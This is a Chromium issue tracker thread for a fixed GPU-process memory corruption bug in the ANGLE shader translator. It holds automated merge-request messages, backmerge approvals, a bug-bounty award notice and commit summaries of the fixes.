[Empty comment from Monorail migration]

### [Deleted User] (2023-12-07)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-07)

Requesting merge to stable M120 because latest trunk commit (1234290) appears to be after stable branch point (1217362).

Requesting merge to dev M121 because latest trunk commit (1234290) appears to be after dev branch point (1233107).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [120, 121].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-12-07)

[note primarily for release team] The cutoff for M120 merges for next week's update is EOD today; since the latest CL just landed <24 hours ago and there are two other CLs needing backmerge here, this shouldn't be rushed to merge and these fixes can be backmerged early next week to be included in the following M120 Stable update. 

### [Deleted User] (2023-12-08)

Requesting merge to stable M120 because latest trunk commit (1234290) appears to be after stable branch point (1217362).

Requesting merge to beta M121 because latest trunk commit (1234290) appears to be after beta branch point (1233107).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [120, 121].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-12-09)

Requesting merge to stable M120 because latest trunk commit (1234290) appears to be after stable branch point (1217362).

Requesting merge to beta M121 because latest trunk commit (1234290) appears to be after beta branch point (1233107).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [120, 121].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-12-10)

Requesting merge to stable M120 because latest trunk commit (1234290) appears to be after stable branch point (1217362).

Requesting merge to beta M121 because latest trunk commit (1234290) appears to be after beta branch point (1233107).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [120, 121].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-12-11)

Requesting merge to stable M120 because latest trunk commit (1234290) appears to be after stable branch point (1217362).

Requesting merge to beta M121 because latest trunk commit (1234290) appears to be after beta branch point (1233107).

Merge review required: a commit with DEPS changes was detected.

Merge review required: a commit with DEPS changes was detected.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [120, 121].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-12-11)

121 and 120 merges tentatively approved for the following fixes: 
https://crrev.com/c/5074629
https://crrev.com/c/5077407
https://crrev.com/c/5077408

https://crrev.com/c/5074629 and https://crrev.com/c/5077407 were landed on 1 December, and https://crrev.com/c/5077408 on 6 December 
I see no issues with stability or perf data for either of these three fixes; please confirm there are no complexity or stability risks or concerns before backmerging since we are about to go into a release freeze. 

If you are certain of the safety of these three fixes, please go ahead and merge to M121 / branch 6167 at soonest (by EOD tomorrow, Tuesday, 12 December) so these fixes can be included in the next M121 Beta update before the release freeze, shipping Wednesday. 

Please merge to M120 Stable / branch 6099 at your convenience so this fix can be included in the first Stable release in January following release freeze. 

### am...@google.com (2023-12-14)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-12-14)

Congratulations Toan Pham and Tri Dang! The Chrome VRP Panel has decided to award you $15,000 for this high-quality report of memory corruption in the GPU process. As mentioned earlier, a member of our p2p-vrp@ finance team will be in touch with you soon to arrange payment. Thank you for your efforts and reporting this issue to us -- great work! 

### d8...@gmail.com (2023-12-14)

[Comment Deleted]

### [Deleted User] (2023-12-15)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2023-12-15)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-19)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2023-12-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/9d217233a05628574d1de4546d4c88f8718ea552

commit 9d217233a05628574d1de4546d4c88f8718ea552
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Thu Nov 30 20:42:32 2023

M121: Translator: Limit private variable size to 64KB

This is indirectly fixing an issue where passing large arrays in SPIR-V
such that an internal cast is needed (such as array inside interface
block copied to local varaible) causes an overflow of the instruction
length limit (in the absence of OpCopyLogical).

By limiting the size of private variables to 32KB, this limitation is
indirectly enforced.  It was observed that all the test shaders added in
this CL fail on the Nvidia OpenGL drivers, so such a limit seems to be
reasonble.

Bug: chromium:1505009
Change-Id: I8e195f397933625b9002098f94726af23bea9c6c
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5143830
Reviewed-by: Cody Northrop <cnorthrop@google.com>

[modify] https://crrev.com/9d217233a05628574d1de4546d4c88f8718ea552/src/tests/compiler_tests/RecordConstantPrecision_test.cpp
[modify] https://crrev.com/9d217233a05628574d1de4546d4c88f8718ea552/src/compiler/translator/ValidateTypeSizeLimitations.cpp
[modify] https://crrev.com/9d217233a05628574d1de4546d4c88f8718ea552/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/9d217233a05628574d1de4546d4c88f8718ea552/src/compiler/translator/Compiler.cpp
[modify] https://crrev.com/9d217233a05628574d1de4546d4c88f8718ea552/src/tests/gl_tests/GLSLTest.cpp


### gi...@appspot.gserviceaccount.com (2023-12-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/fd015a3752ffc370e959c5b6c500e3f676a6e35e

commit fd015a3752ffc370e959c5b6c500e3f676a6e35e
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Thu Nov 30 20:42:32 2023

M120: Translator: Limit private variable size to 64KB

This is indirectly fixing an issue where passing large arrays in SPIR-V
such that an internal cast is needed (such as array inside interface
block copied to local varaible) causes an overflow of the instruction
length limit (in the absence of OpCopyLogical).

By limiting the size of private variables to 32KB, this limitation is
indirectly enforced.  It was observed that all the test shaders added in
this CL fail on the Nvidia OpenGL drivers, so such a limit seems to be
reasonble.

Bug: chromium:1505009
Change-Id: I75a1e40a538120ffc69ae7edafbdba5830c6b0bb
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5143828
Reviewed-by: Cody Northrop <cnorthrop@google.com>

[modify] https://crrev.com/fd015a3752ffc370e959c5b6c500e3f676a6e35e/src/tests/compiler_tests/RecordConstantPrecision_test.cpp
[modify] https://crrev.com/fd015a3752ffc370e959c5b6c500e3f676a6e35e/src/compiler/translator/ValidateTypeSizeLimitations.cpp
[modify] https://crrev.com/fd015a3752ffc370e959c5b6c500e3f676a6e35e/src/compiler/translator/Compiler.cpp
[modify] https://crrev.com/fd015a3752ffc370e959c5b6c500e3f676a6e35e/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/fd015a3752ffc370e959c5b6c500e3f676a6e35e/src/tests/gl_tests/GLSLTest.cpp


### gi...@appspot.gserviceaccount.com (2023-12-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/0c1d249c3fe252f7f52724111431a3db183de135

commit 0c1d249c3fe252f7f52724111431a3db183de135
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Thu Nov 30 18:53:00 2023

M120: Translator: Optimize field-name-collision check

As each field of the struct was encountered, its name was linearly
checked against previously added fields.  That's O(n^2).

The name collision check is now moved to when the struct is completely
defined, and is done with an unordered_map.

Bug: chromium:1505009
Change-Id: I3fbc23493e5a03e61b631af615cffaf9995fd566
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5143826
Reviewed-by: Cody Northrop <cnorthrop@google.com>

[modify] https://crrev.com/0c1d249c3fe252f7f52724111431a3db183de135/src/compiler/translator/ParseContext.cpp
[modify] https://crrev.com/0c1d249c3fe252f7f52724111431a3db183de135/src/compiler/translator/ParseContext.h
[modify] https://crrev.com/0c1d249c3fe252f7f52724111431a3db183de135/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/0c1d249c3fe252f7f52724111431a3db183de135/src/tests/gl_tests/GLSLTest.cpp


### gi...@appspot.gserviceaccount.com (2023-12-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/98f7e44a9884d95aff99b68e7a29004b00856e9a

commit 98f7e44a9884d95aff99b68e7a29004b00856e9a
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Thu Nov 30 19:12:42 2023

M120: Translator: Fail compilation if too many struct fields

If there are too many struct fields, SPIR-V cannot be produced (as it
has a hard limit of 16383 fields).  The Nvidia GL driver has also been
observed to fail when there are too many fields.

Bug: chromium:1505009
Change-Id: I29fd61d180175e89e7db9ca8ba49ab07585b5f9a
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5143827
Reviewed-by: Cody Northrop <cnorthrop@google.com>

[modify] https://crrev.com/98f7e44a9884d95aff99b68e7a29004b00856e9a/src/compiler/translator/ParseContext.cpp
[modify] https://crrev.com/98f7e44a9884d95aff99b68e7a29004b00856e9a/src/tests/compiler_tests/ExpressionLimit_test.cpp
[modify] https://crrev.com/98f7e44a9884d95aff99b68e7a29004b00856e9a/src/compiler/translator/ParseContext.h
[modify] https://crrev.com/98f7e44a9884d95aff99b68e7a29004b00856e9a/src/tests/gl_tests/GLSLTest.cpp


### am...@chromium.org (2024-01-03)

[Empty comment from Monorail migration]

### pg...@google.com (2024-01-04)

[Empty comment from Monorail migration]

### pg...@google.com (2024-01-04)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1505009?no_tracker_redirect=1

[Multiple monorail components: Internals>GPU>ANGLE, Internals>GPU>SwiftShader]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-14)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40945594)*
